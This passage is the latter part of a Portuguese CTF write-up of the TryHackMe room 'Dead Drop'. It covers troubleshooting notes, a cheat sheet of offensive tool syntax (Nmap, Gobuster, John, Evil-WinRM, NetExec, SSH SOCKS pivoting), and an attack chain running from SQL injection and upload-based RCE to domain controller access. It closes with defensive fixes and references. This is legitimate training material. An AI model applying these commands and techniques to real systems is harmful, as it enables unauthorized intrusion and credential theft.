| Situação | O que ocorreu | O que aprendi |
|---|---|---|
| `admin'` isolado no login | Erro | O bypass precisou de uma condição SQL válida |
| Upload de arquivo sem acioná-lo | Não bastava | A RCE dependia de abrir `/preview/<arquivo>.js` |
| `../etc/passwd` no preview | `File not found` | Não afirmar Path Traversal sem prova |
| `internal.tryhackme.loc` | Não resolveu DNS | Nome de API não é necessariamente domínio AD |
| Chisel nas portas 9000/9001 | Timeout do servidor web à AttackBox | A direção da conexão importa |
| Reverse shell na porta 443 | Sem shell recebido | Iniciar payload não comprova conectividade |
| `ping` pela RCE `node` | `Operation not permitted` | Falta de capability não prova falta de rota |
| HTTP do WEB para AttackBox | Timeout e `tcpdump` sem pacotes | Conferir roteamento, firewall e sentido de conexão |
| Python HTTP para baixar APK pela porta 9900 | Timeout | Usar SCP quando SSH 22 já está disponível |
| `proxychains4 -f` | `exec: -f: not found` | O `proxychains4` da AttackBox era link para ProxyChains 3.1 |
| ProxyChains DNS de `deaddrop.loc` | Timeout em 4.2.2.2:53 | A conexão por IP pode funcionar mesmo se DNS falhar |
| Enumeração da WRK `.51` | Timeout nas portas comuns | Não pressupor SMB/RDP acessível só porque o host responde a ping |
| `ldapsearch` contra `.51` | `Can't contact LDAP server` | Consultar LDAP no DC `.100` |
| Proxy SOCKS após desconexão da VM | Precisa restabelecer SSH `-D` | Primeiro conferir `ss -lntp | grep 1080` |
| `sudo -l` como `svc-drop` | Negado | Escalação para root no Linux não era necessária |
| Conta `j.harris` no DC | Já era Domain Admin | Separar a exploração observada da rota de ACL prevista |

### Mini-checklist para um túnel que parou

Na AttackBox:

~~~bash
# 1. A porta local do SOCKS está aberta?
ss -lntp | grep 1080

# 2. Se não estiver, refazer o túnel:
ssh -N -D 127.0.0.1:1080 svc-drop@192.168.11.200

# 3. Verificar a porta do DC pelo próprio SOCKS:
curl -v --socks5-hostname 127.0.0.1:1080 \
  --connect-timeout 5 --max-time 8 \
  telnet://192.168.11.100:445

# 4. Testar com o ProxyChains 3.1:
proxychains nc -vz -w 3 192.168.11.100 445
~~~

Com o `curl`, `SOCKS5 request granted` e `Connected` já provam que o TCP alcançou o destino. Um timeout posterior pode ocorrer porque SMB não envia uma resposta HTTP espontânea.

<a id="ferramentas"></a>

## 13. Ferramentas — sintaxe e quando usar

| Ferramenta | Exemplo | Objetivo |
|---|---|---|
| **Nmap** | `nmap -sS -sC -sV <web>` | Portas, serviços, versões |
| **Gobuster** | `gobuster dir -u http://<web>/ -w dir.txt -x txt,bak -t 10` | Rotas e arquivos ocultos |
| **curl** | `curl -i http://<web>/login` | Headers, status e respostas HTTP |
| **JADX** | `jadx -d apk_out app.apk` | Descompilar APK para analisar código e strings |
| **grep** | `grep -Rni 'password' apk_out/` | Procurar padrões recursivamente |
| **John** | `john --format=sha512crypt --wordlist=rockyou.txt hash.txt` | Ataque offline de dicionário ao hash |
| **SSH** | `ssh usuario@<web>` | Acesso remoto autenticado ao Linux |
| **SCP** | `scp usuario@<web>:/arquivo .` | Copiar arquivo via SSH |
| **SSH -D** | `ssh -N -D 1080 usuario@<web>` | Criar SOCKS para vários destinos TCP |
| **SSH -L** | `ssh -N -L 13389:<dc>:3389 usuario@<web>` | Encaminhar uma porta específica |
| **ProxyChains** | `proxychains nxc smb <dc>` | Aplicar o SOCKS a uma ferramenta |
| **NetExec** | `nxc smb <dc> -u user -p pass -d dominio` | SMB, identificação e autenticação |
| **ldapsearch** | `ldapsearch -x -H ldap://<dc> -s base` | Consultar RootDSE do AD |
| **Evil-WinRM** | `evil-winrm -i <dc> -u user -p pass` | Shell PowerShell por WinRM |
| **FreeRDP** | `xfreerdp /v:127.0.0.1:13389 /u:user /d:dominio` | Sessão RDP gráfica |
| **find** | `find /home /opt -type f -writable 2>/dev/null` | Buscar arquivos conforme atributos |
| **whoami /all** | comando Windows | Grupos e privilégios do token |
| **Get-Acl** | PowerShell AD | Consultar permissões de objeto |

### Como escolher a técnica durante o reconhecimento

- **Porta web aberta e login presente:** verificar parâmetros, cookies, respostas `200/302/403` e diferenças de autenticação.
- **Upload disponível:** descobrir **onde o arquivo é armazenado e como é processado**. Upload não é sinônimo de RCE.
- **RCE como conta limitada:** inspecionar diretórios da aplicação, bancos, backups e permissões; não começar automaticamente por um exploit de kernel.
- **Hash em backup:** identificar algoritmo, preparar um arquivo limpo e usar John/Hashcat offline.
- **APK:** analisar código e recursos antes de tentar credenciais em outros serviços.
- **SSH válido para host de borda:** preferir `ssh -D` e `ssh -L` a agentes adicionais, quando o encaminhamento SSH está permitido.
- **Conta AD válida:** consultar grupos **e** DACLs. Pertencer a um grupo e poder modificá-lo são condições diferentes.
- **Resultado `Pwn3d!`:** confirmar por execução de comandos ou token, sem presumir que a flag já está acessível.
- **Ambiente aparentemente compartilhado:** não atribuir arquivos de terceiros à própria exploração e não assumir que privilégios atuais são o estado inicial da room.

<a id="referencias"></a>

## 14. Técnicas utilizadas, mitigação e referências

### Técnicas efetivamente utilizadas

| Técnica | Evidência |
|---|---|
| **Reconhecimento de serviços** | Nmap em 22/80 e posteriormente no DC |
| **Directory/Route Enumeration** | Gobuster em `/login` e `/dashboard` |
| **SQL Injection / Authentication Bypass** | Login como admin sem a senha |
| **Unsafe File Upload + Module Loading / RCE** | `teste-rce.js` executado pelo preview |
| **Sensitive Information Disclosure** | Backup `shadow.bak` e banco SQLite |
| **Offline Password Cracking** | SHA-512 Crypt recuperado com John |
| **Credential Exposure in Mobile Application** | `Config.java` com usuário e senha |
| **SSH / SCP** | Acesso `svc-drop` e transferência do APK |
| **SSH Dynamic Port Forwarding / Pivoting** | SOCKS5 em `127.0.0.1:1080` |
| **Proxy-aware Enumeration** | ProxyChains, Nmap, NetExec e LDAP |
| **Credential Use / Remote Administration** | SMB, WinRM e RDP no DC |
| **AD Group and Privilege Enumeration** | `whoami /all` e `whoami /priv` |

**Não fiz:** dump de `NTDS.dit`, Kerberoasting, Pass-the-Hash, PsExec, escalada Linux para root, exploração da workstation ou alteração de associação via `AddMember`. A última é a rota alternativa da room, não parte do acesso que executei.

### Principais correções defensivas

| Falha observada | Correção |
|---|---|
| SQL concatenado ao login | Prepared statements e controles de sessão |
| Preview executando upload `.js` | Nunca importar código fornecido por usuário; tratar uploads como dados isolados |
| Backup legível com hash de conta | Controlar acesso e retenção de backups, credenciais fortes |
| Credenciais fixas em APK | Remover segredos do cliente e usar autenticação adequada |
| Contas privilegiadas em grupos aninhados | Auditar DACLs, `MemberOf` e delegações; menor privilégio |
| SSH e acesso lateral via conta de serviço | Segmentar rede e limitar port forwarding e acesso remoto conforme necessidade |
| Compartilhamento de estado de laboratório | Restabelecer estado inicial antes de atribuir uma escalada à própria sessão |

### Posts relacionados

- [Silent Monitor — SQLi, Command Injection e KeePass até root](https://redp4w.github.io/notes/silent-monitor-sqli-command-injection-keepass-root/) — outra cadeia SQLi → RCE → credenciais.
- [Proxy — Active Directory e delegação Kerberos](https://redp4w.github.io/notes/proxy/) — enumeração e movimento no domínio.
- [AD Authenticated Enumeration](https://redp4w.github.io/notes/ad-authenticated-enumeration/) — usuários, grupos e informações do diretório.
- [AD Lateral Movement](https://redp4w.github.io/notes/ad-lateral-movement/) — movimentação lateral Windows.
- [Bind e Reverse Shell](https://redp4w.github.io/notes/bind-reverse-shell/) — direção da conexão e diferenças práticas.
- [Criando Wordlists](https://redp4w.github.io/notes/criando-wordlists/) — dicionários para ataques offline.

### Documentação e leituras externas

- [TryHackMe — Dead Drop](https://tryhackme.com/room/dead-drop)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [John the Ripper](https://www.openwall.com/john/)
- [JADX](https://github.com/skylot/jadx)
- [NetExec](https://www.netexec.wiki/)
- [ProxyChains-NG](https://github.com/rofl0r/proxychains-ng)
- [BloodHound](https://github.com/SpecterOps/BloodHound)
- [Impacket](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Discussão técnica do ACL AddSelf/AddMember na Dead Drop](https://classroom.anir0y.in/post/thm-room-dead-drop/) — referência **somente para a rota alternativa que não executei**.

---

**Conclusão:** a room foi resolvida por uma cadeia de evidências, não por um exploit único. A SQLi abriu o painel; o preview executou JavaScript; o backup revelou um hash; o John abriu o SSH; o SSH criou o túnel; o APK revelou uma credencial do domínio; e o WinRM deu acesso ao DC. A conta já era Domain Admin quando a testei. A parte de ACL continua sendo a lição de como um direito aparentemente limitado sobre um grupo **aninhado** pode conceder administração do domínio.

> **Nota final:** em labs descartáveis do TryHackMe, encerrar a máquina normalmente descarta o ambiente. Em ambientes persistentes de testes autorizados, registrar e remover artefatos é parte do trabalho.
